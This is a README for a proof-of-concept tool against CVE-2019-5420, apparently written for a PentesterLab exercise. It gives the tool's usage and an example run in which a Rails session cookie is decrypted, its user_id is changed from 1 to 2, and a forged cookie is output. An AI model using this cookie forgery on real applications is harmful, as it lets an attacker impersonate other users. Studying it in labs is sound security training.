# CVE-2019-5420-PoC

Wrote this for PentesterLab

> If you are from PentesterLab's don't cheat, it's alot better to learn.

Hope it's useful to someone, if not to me in the future :)

Nice argparse stuff, not a bad PoC

## Usage
```
usage: script.py [-h] --appname APPNAME --cookie COOKIE [--modify KEY VALUE]

CVE-2019-5420

options:
  -h, --help          show this help message and exit
  --appname APPNAME   Application name (e.g., PentesterLab)
  --cookie COOKIE     Encrypted cookie data
  --modify KEY VALUE  Key-value pairs to modify (can be specified multiple times)
```

## Example
```bash
$ python3 script.py --appname PentesterLab --cookie "e3utyeCe5u6G5Xr24kwHMUDRCzDUWjqoS%2BmiajdJfgEGYlLNaJ1MPM1RRPDHGxOVg16BZAhNr6gGVXRTQ6Ln0kw2zNjggqGhYrE7NhQcZkGEk8yDBgtIq8JENnLpUKEvcBXV4Qh6bWA%2BY9UJc%2BnNcYqVIcgDHVNkvYw%3D--lNYQlBUxql44nouw--rRDZMrhhG8hWyubkbsuqaQ%3D%3D" --modify user_id 2
Encrypted data (hex): 7b7badc9e09ee6ee86e57af6e24c073140d10b30d45a3aa84be9a26a37497e01066252cd689d4c3ccd5144f0c71b1395835e8164084dafa80655745343a2e7d24c36ccd8e082a1a162b13b36141c66418493cc83060b48abc2443672e950a12f7015d5e1087a6d603e63d50973e9cd718a9521c8031d5364bd8c
IV (hex): 94d610941531aa5e389e8bb0
Auth tag (hex): ad10d932b8611bc856cae6e46ecbaa69
Decrypted cookie: {'session_id': '1517c20565615fed2f52ed7c075aff56', '_csrf_token': '4iKA7dSVBcBClhJF3y1TpYrqBMRN4LDvvSGzjgOYyWI=', 'user_id': 1}
Modified cookie: {'session_id': '1517c20565615fed2f52ed7c075aff56', '_csrf_token': '4iKA7dSVBcBClhJF3y1TpYrqBMRN4LDvvSGzjgOYyWI=', 'user_id': 2}
New cookie: e3utyeCe5u6G5Xr24kwFIkTVDWSFWD%2BrSOqlbmRKf1dSMVWaac4Yb8pTEPfHSBCBjVD%2BJSRcuoUUZWtZRuWz0kJ/pa2%2BrbPARIEvNxs2b2vfoLvkD2Nuqtl7FX6QTqttSgLk7TFaWFMge8VNBozSJtXQceIZHAMB5ZUDFmW8mA%3D%3D--lNYQlBUxql44nouw--Kv3Gdq9ipuD682IqMtxPgA%3D%3D
```


